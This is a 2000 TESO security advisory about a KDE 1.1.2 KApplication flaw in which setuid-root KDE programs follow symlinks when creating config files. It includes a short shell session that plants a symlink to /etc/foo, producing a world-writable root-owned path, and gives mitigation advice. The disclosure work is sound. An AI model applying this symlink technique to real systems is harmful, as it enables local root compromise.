@@ -1,0 +1,175 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+
+- ------
+
+TESO Security Advisory
+2000/05/29
+
+KDE KApplication {} configfile vulnerability
+
+
+Summary
+===================
+
+    A bug within the KDE configuration-file management has been
+    discovered.
+    Due to insecure creation of configuration files via KApplication-class, 
+    local lusers can create arbitrary files when running setuid root 
+    KDE-programs.
+    This can result in a complete compromise of the system.
+
+
+Systems Affected
+===================
+
+    The vulnerability is at least present within KDE 1.1.2.
+    All tests were performed on a SuSE 6.4 standard installation.
+
+
+Tests
+===================
+
+	bash-2.03$ nl /tmp/a.out.cc
+	     1	#include <string.h>
+	     2	#include <stdlib.h>
+	     3	#include <stdio.h>
+	     4	#include <kapp.h>
+
+
+	     5	int main(int argc, char **argv)
+	     6	{
+	     7	      KApplication *base = new KApplication(argc, argv);
+
+	     8	      base->exec();
+	     9	      return 0;
+	    10	}
+	    11
+	bash-2.03$ ls -la /etc/foo
+	ls: /etc/foo: No such file or directory
+
+	bash-2.04$ ln -s /etc/foo ~/.kde/share/config/a.outrc
+	bash-2.03$ ls -la /tmp/a.out
+	-rwsr-sr-x   1 root     root        19450 May 28 14:14 /tmp/a.out
+	bash-2.03$ /tmp/a.out
+	^C
+
+	bash-2.03$ ls -la /etc/foo
+	-rw-rw-rw-   1 stealth  500             0 May 28 14:26 /etc/foo
+	bash-2.03$
+
+    (Output formatted to improve readability).
+
+
+Impact
+===================
+
+    An attacker may gain local root-access to a system where vulnerable KDE
+    distributions are installed.
+    Due to the GUI-nature of KDE, it might become difficult for an attacker
+    to gain a root-shell on a remote system. However, the individual could 
+    modify the DISPLAY environment variable to redirect the output to one 
+    of his own machines.
+    A vulnerable system must have at least one setuser-id program
+    installed which utilizes the KApplication class.
+    Such programs include ktvision and ktuner, for an example.
+
+
+Explanation
+===================
+
+    Obviously, KDE doesn't check for possible symlinks when creating
+    configuration-files. This may result in arbitrary file-creation or 
+    chmod's of any file.
+    We assume the bug is within the KApplication::init() function:
+    
+    ...
+    
+    // now for the local app config file
+    QString aConfigName = KApplication::localkdedir();
+    aConfigName += "/share/config/";
+    aConfigName += aAppName;
+    aConfigName += "rc";
+
+    QFile aConfigFile( aConfigName );
+    ...
+
+
+    This instanciation probably creates the file. However we haven't checked
+    QFile {} further.		
+
+
+Solution
+===================
+
+    Neither run KDE applications setuid nor setgid.
+    The KDE developers have been informed. A patch should be made available 
+    soon. Upgrade as promptly as possible.
+
+
+Acknowledgments
+================
+
+    The bug-discovery and the demonstration programs are due to
+    Sebastian "Stealth" Krahmer [1].
+    Further checking on different distributions have been made
+    by Scut.
+
+    This advisory was written by Sebastian and Scut.
+
+
+Contact Information
+===================
+
+    The TESO crew can be reached by mailing to teso@coredump.cx.
+    Our web page is at http://teso.scene.at/
+    
+    Stealth may be reached through [1].
+
+
+References
+===================
+
+    [1] http://www.cs.uni-potsdam.de/homepages/students/linuxer/
+
+    [2] TESO
+	http://teso.scene.at or https://teso.scene.at/
+
+
+Disclaimer
+===================
+
+    This advisory does not claim to be complete or to be usable for any
+    purpose. Especially information about the vulnerable systems may be
+    inaccurate or wrong. The supplied exploit is not to be used for malicious
+    purposes, but for educational purposes only.
+
+    This advisory is free for open distribution in unmodified form.
+    Articles that are based on information from this advisory should include
+    links [1] and [2].
+
+
+Exploit
+===================
+
+    We've created a working demonstration program to exploit the vulnerability.
+
+    The exploit is available from
+
+       http://teso.scene.at/ or https://teso.scene.at/
+
+    and
+
+       http://www.cs.uni-potsdam.de/homepages/students/linuxer/
+
+
+- ------
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.0 (GNU/Linux)
+Comment: For info see http://www.gnupg.org
+
+iD8DBQE5MWgLcZZ+BjKdwjcRAqJfAJwM5ksv/2dm7liESPMlYkQevZcfiACfb45I
+0Xp/9kMRr1FTMV6r0qh+lao=
+=6q3d
+-----END PGP SIGNATURE-----
